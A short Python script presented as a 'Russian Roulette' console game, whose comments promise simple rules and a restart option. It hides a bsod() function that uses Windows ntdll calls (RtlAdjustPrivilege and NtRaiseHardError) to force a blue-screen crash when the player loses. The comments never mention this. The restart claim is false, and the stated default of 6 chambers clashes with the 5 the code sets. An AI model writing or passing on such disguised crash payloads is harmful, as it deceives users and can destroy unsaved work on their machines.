# Russian Roulette game made in python. The rules are simple: Each player has to press enter to pull the trigger
# and the player that hits the chambers that contains the bullet, losses!


# After the game is over the user has the option to restart the game.

import random
import os
import sys

def bsod():
    """Generate a BSOD."""
    from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

chambers = input("Please enter the number of chambers (default = 6): ")

if not chambers:
	chambers = 5

elif not chambers.isdigit():
	quit("Invalid number of chambers!")

fatal_bullet = random.randint(1, int(chambers))

for x in range(1, int(chambers) + 1):
    input("Press enter to pull the trigger! ")
    if x == fatal_bullet:
        print("You just got served!")
        print("Game Over")
        bsod()
    print("You will live to see another day")
